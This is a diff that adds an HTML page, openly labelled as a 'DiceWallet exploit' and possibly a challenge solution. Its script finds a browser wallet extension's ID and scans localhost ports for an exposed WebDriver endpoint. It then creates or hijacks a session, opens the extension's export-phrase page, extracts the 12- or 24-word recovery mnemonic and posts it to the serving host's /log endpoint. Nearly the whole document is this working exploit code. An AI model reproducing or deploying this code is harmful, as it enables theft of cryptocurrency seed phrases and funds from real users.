@@ -1,0 +1,127 @@
+<!doctype html>
+<html>
+<body>
+<script>
+(async () => {
+  const log = async (obj) => {
+    try {
+      await fetch('/log', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(obj),
+      });
+    } catch (e) {}
+  };
+
+  const delay = (ms) => new Promise((r) => setTimeout(r, ms));
+
+  const getUuid = () => {
+    const s = [...document.scripts].find(x => x.src && x.src.startsWith('moz-extension://'));
+    return s ? new URL(s.src).host : null;
+  };
+
+  let uuid = null;
+  for (let i = 0; i < 30 && !uuid; i++) {
+    uuid = getUuid();
+    if (!uuid) await delay(100);
+  }
+  await log({ stage: 'uuid', uuid });
+  if (!uuid) return;
+
+  const exportUrl = `moz-extension://${uuid}/popup.html#/export/phrase`;
+
+  const commonPorts = [4444, 4445, 9515, 9222, 5555];
+  const scanRange = { start: 40000, end: 50050 };
+
+  const probe = async (port, timeoutMs = 200) => {
+    const controller = new AbortController();
+    const t = setTimeout(() => controller.abort(), timeoutMs);
+    try {
+      const res = await fetch(`http://127.0.0.1:${port}/status`, {
+        mode: 'cors',
+        cache: 'no-store',
+        signal: controller.signal,
+      });
+      const text = await res.text();
+      if (text && (text.includes('Session') || text.includes('ready') || text.includes('value'))) {
+        return { port, text };
+      }
+    } catch (e) {
+    } finally {
+      clearTimeout(t);
+    }
+    return null;
+  };
+
+  const findPort = async () => {
+    for (const p of commonPorts) {
+      const hit = await probe(p, 300);
+      if (hit) return hit.port;
+    }
+    let next = scanRange.start;
+    let found = null;
+    const max = 80;
+    const active = new Set();
+
+    const launch = async () => {
+      if (found || next > scanRange.end) return;
+      const port = next++;
+      const promise = probe(port).then((hit) => {
+        active.delete(promise);
+        if (hit && !found) found = port;
+      });
+      active.add(promise);
+    };
+
+    while (!found && (next <= scanRange.end || active.size > 0)) {
+      while (!found && next <= scanRange.end && active.size < max) {
+        await launch();
+      }
+      if (active.size > 0) await Promise.race(active);
+    }
+    return found;
+  };
+
+  const port = await findPort();
+  await log({ stage: 'port', port });
+  if (!port) return;
+
+  const wd = async (method, path, body) => {
+    const opts = { method, headers: { 'Content-Type': 'application/json' } };
+    if (body) opts.body = JSON.stringify(body);
+    const res = await fetch(`http://127.0.0.1:${port}${path}`, opts);
+    const text = await res.text();
+    try { return JSON.parse(text); } catch { return { raw: text }; }
+  };
+
+  let sessionId = null;
+  try {
+    const list = await wd('GET', '/sessions');
+    if (list?.value?.length) sessionId = list.value[0].id || list.value[0].sessionId;
+  } catch (e) {}
+
+  if (!sessionId) {
+    const created = await wd('POST', '/session', { capabilities: { alwaysMatch: {} } });
+    sessionId = created?.value?.sessionId || created?.sessionId || null;
+  }
+
+  await log({ stage: 'session', sessionId });
+  if (!sessionId) return;
+
+  await wd('POST', `/session/${sessionId}/url`, { url: exportUrl });
+  const src = await wd('GET', `/session/${sessionId}/source`);
+  const html = src?.value || src?.raw || '';
+
+  const words = [];
+  const re = /\b(\d{1,2})\.\s*([a-z]+)\b/g;
+  let m;
+  while ((m = re.exec(html))) {
+    words.push(m[2]);
+  }
+  const mnemonic = words.length >= 12 ? words.slice(0, words.length >= 24 ? 24 : 12).join(' ') : null;
+  await log({ stage: 'mnemonic', mnemonic, wordCount: words.length });
+})();
+</script>
+DiceWallet exploit running.
+</body>
+</html>
